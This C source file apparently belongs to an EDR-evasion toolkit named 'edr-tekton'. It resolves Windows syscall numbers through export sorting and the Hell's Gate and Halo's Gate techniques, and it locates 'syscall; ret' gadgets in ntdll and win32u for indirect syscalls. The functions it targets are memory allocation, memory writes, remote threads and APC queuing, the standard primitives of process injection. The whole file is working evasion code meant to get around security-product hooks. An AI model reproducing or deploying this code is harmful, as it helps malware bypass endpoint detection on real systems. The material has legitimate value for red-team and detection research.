/*
 * edr-tekton :: SSN Resolution Engine
 * Cat 2.2: Zw* sorting method
 * Cat 2.3: Hell's Gate / Halo's Gate stub reading
 * Cat 45: FreshyCalls, RecycledGate
 *
 * Resolves syscall numbers (SSNs) dynamically so direct/indirect
 * syscall stubs work across Windows builds without hardcoded tables.
 */

#include "tekton/modules/syscall.h"
#include "tekton/util/peb.h"
#include "tekton/util/pe.h"
#include "tekton/util/hash.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ── SSN Resolution Internals ───────────────────────────── */

/*
 * Target Nt* functions and where to store their SSNs.
 * The offset_ssn points into TEKTON_RESOLVED_STATE.
 */
typedef struct _SSN_TARGET {
    const char* func_name;
    DWORD       func_hash;              /* CRC32B hash */
    SIZE_T      offset_ssn;             /* Offset to SSN slot in resolved state */
    SIZE_T      offset_fn;              /* Offset to function pointer slot */
} SSN_TARGET;

#define SSN_OFFSET(field) ((SIZE_T)&((PTEKTON_RESOLVED_STATE)0)->field)
#define FN_OFFSET(field)  ((SIZE_T)&((PTEKTON_RESOLVED_STATE)0)->field)

static SSN_TARGET g_ssn_targets[] = {
    { "NtAllocateVirtualMemory",  0, SSN_OFFSET(ssn_nt_allocate_virtual_memory),  FN_OFFSET(fn_nt_allocate_virtual_memory)  },
    { "NtWriteVirtualMemory",     0, SSN_OFFSET(ssn_nt_write_virtual_memory),     FN_OFFSET(fn_nt_write_virtual_memory)     },
    { "NtProtectVirtualMemory",   0, SSN_OFFSET(ssn_nt_protect_virtual_memory),   FN_OFFSET(fn_nt_protect_virtual_memory)   },
    { "NtCreateThreadEx",         0, SSN_OFFSET(ssn_nt_create_thread_ex),         FN_OFFSET(fn_nt_create_thread_ex)         },
    { "NtCreateSection",          0, SSN_OFFSET(ssn_nt_create_section),           FN_OFFSET(fn_nt_create_section)           },
    { "NtMapViewOfSection",       0, SSN_OFFSET(ssn_nt_map_view_of_section),      FN_OFFSET(fn_nt_map_view_of_section)      },
    { "NtQueueApcThread",         0, SSN_OFFSET(ssn_nt_queue_apc_thread),         FN_OFFSET(fn_nt_queue_apc_thread)         },
    { "NtOpenProcess",            0, SSN_OFFSET(ssn_nt_open_process),             FN_OFFSET(fn_nt_open_process)             },
    { "NtClose",                  0, SSN_OFFSET(ssn_nt_close),                    FN_OFFSET(fn_nt_close)                    },
};

#define SSN_TARGET_COUNT (sizeof(g_ssn_targets) / sizeof(g_ssn_targets[0]))

/* ── Sorting method structures (Cat 2.2) ────────────────── */

typedef struct _ZW_ENTRY {
    DWORD   rva;        /* Export RVA */
    DWORD   hash;       /* CRC32B of function name */
    PVOID   address;    /* Resolved address */
} ZW_ENTRY;

/* qsort comparator: sort Zw entries by RVA */
static int zw_cmp_rva(const void* a, const void* b) {
    DWORD rva_a = ((const ZW_ENTRY*)a)->rva;
    DWORD rva_b = ((const ZW_ENTRY*)b)->rva;
    if (rva_a < rva_b) return -1;
    if (rva_a > rva_b) return 1;
    return 0;
}

/* ── Cat 2.2: Sorting method ────────────────────────────── */
/*
 * Enumerate all Zw* exports from ntdll, sort by RVA.
 * Position in sorted list = SSN.
 */

static TEKTON_STATUS resolve_ssn_sorting(
    PVOID ntdll_base,
    PTEKTON_RESOLVED_STATE resolved
) {
    if (!ntdll_base) return TEKTON_ERR_INVALID_PARAM;

    TEKTON_PE_INFO pe_info;
    TEKTON_STATUS status = TektonPeParse(ntdll_base, &pe_info);
    if (status != TEKTON_OK) return status;

    if (!pe_info.export_dir || pe_info.num_exports == 0) {
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Allocate space for all Zw* entries */
    ZW_ENTRY* zw_list = (ZW_ENTRY*)malloc(sizeof(ZW_ENTRY) * pe_info.num_exports);
    if (!zw_list) return TEKTON_ERR_ALLOC;

    DWORD zw_count = 0;

#ifdef _WIN32
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)pe_info.nt_headers;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)pe_info.export_dir;

    DWORD* names    = (DWORD*)((BYTE*)ntdll_base + exports->AddressOfNames);
    WORD*  ordinals = (WORD*)((BYTE*)ntdll_base + exports->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)((BYTE*)ntdll_base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)ntdll_base + names[i]);

        /* Filter: only Zw* functions (these map 1:1 with Nt* syscalls) */
        if (name[0] == 'Z' && name[1] == 'w') {
            zw_list[zw_count].rva     = funcs[ordinals[i]];
            zw_list[zw_count].hash    = TektonHashCrc32bStringA(name);
            zw_list[zw_count].address = (BYTE*)ntdll_base + funcs[ordinals[i]];
            zw_count++;
        }
    }
#else
    /* Non-Windows dev stub */
    TLOG_DEBUG("SSN sorting: non-Windows, generating fake SSNs");
    free(zw_list);

    for (DWORD i = 0; i < SSN_TARGET_COUNT; i++) {
        DWORD* ssn_slot = (DWORD*)((BYTE*)resolved + g_ssn_targets[i].offset_ssn);
        *ssn_slot = i + 0x18; /* Fake SSN */
    }
    resolved->ssns_resolved = TRUE;
    return TEKTON_OK;
#endif

    if (zw_count == 0) {
        free(zw_list);
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Sort by RVA: position in sorted list = SSN */
    qsort(zw_list, zw_count, sizeof(ZW_ENTRY), zw_cmp_rva);

    TLOG_DEBUG("SSN sorting: found %lu Zw* exports, sorted by RVA", (unsigned long)zw_count);

    /* Map Zw* hashes to our Nt* targets */
    /* Zw and Nt versions share the same SSN, name differs by prefix */
    DWORD resolved_count = 0;

    for (DWORD t = 0; t < SSN_TARGET_COUNT; t++) {
        /* Build the Zw* equivalent name hash */
        char zw_name[128];
        snprintf(zw_name, sizeof(zw_name), "Zw%s", g_ssn_targets[t].func_name + 2);
        DWORD zw_hash = TektonHashCrc32bStringA(zw_name);

        for (DWORD s = 0; s < zw_count; s++) {
            if (zw_list[s].hash == zw_hash) {
                DWORD* ssn_slot = (DWORD*)((BYTE*)resolved + g_ssn_targets[t].offset_ssn);
                *ssn_slot = s; /* Index = SSN */

                TLOG_TRACE("SSN: %s (Zw) = %lu", g_ssn_targets[t].func_name, (unsigned long)s);
                resolved_count++;
                break;
            }
        }
    }

    free(zw_list);

    if (resolved_count > 0) {
        resolved->ssns_resolved = TRUE;
    }

    TLOG_INFO("SSN sorting: resolved %lu/%lu syscall numbers",
        (unsigned long)resolved_count, (unsigned long)SSN_TARGET_COUNT);

    return resolved_count > 0 ? TEKTON_OK : TEKTON_ERR_NOT_FOUND;
}

/* ── Cat 2.3: Hell's Gate / Halo's Gate ─────────────────── */
/*
 * Read SSN directly from the Nt* stub prologue bytes.
 * Pattern: 4C 8B D1 (mov r10, rcx) + B8 XX XX 00 00 (mov eax, SSN)
 * If hooked, check neighbor stubs at +/- 0x20 and calculate offset.
 */

static TEKTON_STATUS resolve_ssn_hellsgate(
    PVOID ntdll_base,
    PTEKTON_RESOLVED_STATE resolved,
    BOOL use_halos   /* fallback to neighbor stubs if hooked */
) {
    if (!ntdll_base) return TEKTON_ERR_INVALID_PARAM;

    DWORD resolved_count = 0;

    for (DWORD t = 0; t < SSN_TARGET_COUNT; t++) {
        /* Get function address */
        PVOID func = TektonPeFindExport(ntdll_base, g_ssn_targets[t].func_name);
        if (!func) continue;

        /* Store function pointer */
        PVOID* fn_slot = (PVOID*)((BYTE*)resolved + g_ssn_targets[t].offset_fn);
        *fn_slot = func;

        BYTE* stub = (BYTE*)func;

        /*
         * Check for clean stub: 4C 8B D1 B8 XX XX 00 00
         * mov r10, rcx -> syscall convention
         * mov eax, SSN -> load syscall number
         */
        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
            stub[3] == 0xB8) {
            /* Clean stub, read SSN directly */
            DWORD ssn = *(DWORD*)(stub + 4);
            DWORD* ssn_slot = (DWORD*)((BYTE*)resolved + g_ssn_targets[t].offset_ssn);
            *ssn_slot = ssn;

            TLOG_TRACE("Hell's Gate: %s SSN = %lu (clean stub)",
                g_ssn_targets[t].func_name, (unsigned long)ssn);
            resolved_count++;
            continue;
        }

        /* Stub is hooked (JMP patch). Try Halo's Gate if enabled */
        if (!use_halos) {
            TLOG_WARN("Hell's Gate: %s stub is hooked, skipping", g_ssn_targets[t].func_name);
            continue;
        }

        /*
         * Halo's Gate: check neighboring stubs.
         * Each Nt* stub is ~0x20 bytes apart.
         * Read neighbor's SSN and adjust by offset.
         */
        BOOL found = FALSE;
        for (int delta = 1; delta <= 8; delta++) {
            /* Check stub above (lower SSN) */
            BYTE* neighbor_down = stub - (delta * 0x20);
            if (neighbor_down[0] == 0x4C && neighbor_down[1] == 0x8B &&
                neighbor_down[2] == 0xD1 && neighbor_down[3] == 0xB8) {
                DWORD neighbor_ssn = *(DWORD*)(neighbor_down + 4);
                DWORD ssn = neighbor_ssn + delta;

                DWORD* ssn_slot = (DWORD*)((BYTE*)resolved + g_ssn_targets[t].offset_ssn);
                *ssn_slot = ssn;

                TLOG_TRACE("Halo's Gate: %s SSN = %lu (neighbor -%d)",
                    g_ssn_targets[t].func_name, (unsigned long)ssn, delta);
                resolved_count++;
                found = TRUE;
                break;
            }

            /* Check stub below (higher SSN) */
            BYTE* neighbor_up = stub + (delta * 0x20);
            if (neighbor_up[0] == 0x4C && neighbor_up[1] == 0x8B &&
                neighbor_up[2] == 0xD1 && neighbor_up[3] == 0xB8) {
                DWORD neighbor_ssn = *(DWORD*)(neighbor_up + 4);
                DWORD ssn = neighbor_ssn - delta;

                DWORD* ssn_slot = (DWORD*)((BYTE*)resolved + g_ssn_targets[t].offset_ssn);
                *ssn_slot = ssn;

                TLOG_TRACE("Halo's Gate: %s SSN = %lu (neighbor +%d)",
                    g_ssn_targets[t].func_name, (unsigned long)ssn, delta);
                resolved_count++;
                found = TRUE;
                break;
            }
        }

        if (!found) {
            TLOG_WARN("Halo's Gate: %s, could not find clean neighbor", g_ssn_targets[t].func_name);
        }
    }

    if (resolved_count > 0) {
        resolved->ssns_resolved = TRUE;
    }

    TLOG_INFO("%s: resolved %lu/%lu SSNs",
        use_halos ? "Halo's Gate" : "Hell's Gate",
        (unsigned long)resolved_count, (unsigned long)SSN_TARGET_COUNT);

    return resolved_count > 0 ? TEKTON_OK : TEKTON_ERR_NOT_FOUND;
}

/* ── Find syscall gadget in .text section ───────────────── */
/*
 * Locate `syscall; ret` (0x0F 0x05 0xC3) in ntdll or win32u .text section.
 * Used for indirect syscalls (Cat 2.4).
 */

static PVOID find_syscall_gadget(PVOID dll_base) {
    if (!dll_base) return NULL;

    PVOID text_base = NULL;
    DWORD text_size = 0;

    TEKTON_STATUS status = TektonPeFindTextSection(dll_base, &text_base, &text_size);
    if (status != TEKTON_OK || !text_base) return NULL;

    /* Search for: 0F 05 C3 (syscall; ret) */
    BYTE pattern[] = { 0x0F, 0x05, 0xC3 };
    PVOID gadget = TektonPeFindPattern(text_base, text_size, pattern, sizeof(pattern));

    if (gadget) {
        TLOG_DEBUG("Syscall gadget found at %p", gadget);
    }

    return gadget;
}

/* ── Public: Master SSN Resolution ──────────────────────── */
/*
 * Called by the syscall module to resolve all SSNs using
 * the configured method.
 */

TEKTON_STATUS TektonSsnResolve(
    PVOID               ntdll_base,
    TEKTON_SSN_METHOD   method,
    PTEKTON_RESOLVED_STATE resolved
) {
    if (!ntdll_base || !resolved) return TEKTON_ERR_INVALID_PARAM;

    /* Pre-compute target hashes */
    for (DWORD i = 0; i < SSN_TARGET_COUNT; i++) {
        g_ssn_targets[i].func_hash = TektonHashCrc32bStringA(g_ssn_targets[i].func_name);
    }

    switch (method) {
        case TEKTON_SSN_SORT:
            return resolve_ssn_sorting(ntdll_base, resolved);

        case TEKTON_SSN_HELLS_GATE:
            return resolve_ssn_hellsgate(ntdll_base, resolved, FALSE);

        case TEKTON_SSN_HALOS_GATE:
            return resolve_ssn_hellsgate(ntdll_base, resolved, TRUE);

        case TEKTON_SSN_FRESHYCALLS:
            /* FreshyCalls: sorting first, then gate for any that fail */
            {
                TEKTON_STATUS st = resolve_ssn_sorting(ntdll_base, resolved);
                if (st != TEKTON_OK) {
                    st = resolve_ssn_hellsgate(ntdll_base, resolved, TRUE);
                }
                return st;
            }

        case TEKTON_SSN_RECYCLED:
        case TEKTON_SSN_SYSWHISPERS4:
            /* These use the same gate approach with additional obfuscation */
            return resolve_ssn_hellsgate(ntdll_base, resolved, TRUE);

        default:
            return TEKTON_ERR_INVALID_PARAM;
    }
}

/* ── Public: Find Gadgets ───────────────────────────────── */

TEKTON_STATUS TektonSyscallFindGadgets(
    PVOID ntdll_base,
    PTEKTON_RESOLVED_STATE resolved,
    BOOL use_win32u
) {
    if (!ntdll_base || !resolved) return TEKTON_ERR_INVALID_PARAM;

    /* Primary gadget from ntdll */
    resolved->syscall_gadget = find_syscall_gadget(ntdll_base);

    /* Alternative gadget from win32u.dll (Cat 2.12) */
    if (use_win32u) {
        PVOID win32u_base = TektonPebGetModuleBase(L"win32u.dll");
        if (win32u_base) {
            resolved->syscall_gadget_alt = find_syscall_gadget(win32u_base);
            TLOG_DEBUG("win32u.dll syscall gadget: %p", resolved->syscall_gadget_alt);
        }
    }

    if (!resolved->syscall_gadget && !resolved->syscall_gadget_alt) {
        TLOG_ERROR("No syscall gadget found in ntdll or win32u");
        return TEKTON_ERR_NOT_FOUND;
    }

    return TEKTON_OK;
}
